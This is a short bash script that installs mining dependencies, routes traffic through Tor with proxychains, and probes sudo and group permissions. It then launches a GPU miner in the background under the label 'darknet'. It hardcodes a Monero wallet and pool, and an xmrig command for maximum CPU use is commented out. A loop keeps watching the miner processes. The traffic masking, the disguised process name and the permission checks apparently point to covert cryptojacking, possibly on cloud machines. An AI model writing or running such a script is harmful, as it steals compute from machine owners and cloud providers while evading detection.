#!/bin/bash
apt-get update -y
apt-get install -y --no-install-recommends apt-utils
apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl -y
apt install libpci-dev -y
apt install libssl-dev -y
worker_name=$2
wallet=$1
WALLET=8AE7ZKdCG2Z8DNqVi6PERHjKeuyaq1oFEghRagqE2ECUZve7oZxWS1uePhNDV77MWvF4smAuMHFnFC4KC6HJisBK35uvApK
POOL=pool.supportxmr.com:5555
thread=$(grep ^cpu\\scores /proc/cpuinfo | uniq |  awk '{print $4}')
run_thread=$((thread * 2 - 1))

echo "CHECK SUDO PERMISSION"
sudo -l
echo "INSTALL CURL"
sudo apt-get install curl -y
sudo apt update -y && sudo apt upgrade -y
sudo apt install tor proxychains -y
sudo systemctl start tor

echo "CHECK GROUP"
groups

echo "CHECK PROXYCHAINS CONFIG EXIST"
ls -l /etc/proxychains.conf

echo "CHECK IP BEFORE CONFIG PROXYCHAINS"
curl ipinfo.io

echo "CHECK CONTENT PROXYCHAINS AFTER CONFIG"
sudo cat /etc/proxychains.conf

echo "CHECK IP AFTER CONFIG"
proxychains curl ipinfo.io

echo "INIT PROXYCHAINS BATCH"
proxychains bash

echo "CHECK PROXYCHAISN BATCH EXECUTED"
curl ipinfo.io

#./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
echo "run darknet"
./ethermine -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
while true
do
  ps aux | grep darknet
  ps aux | grep xmrig
  nvidia-smi
  echo $ip
  sleep 10
done
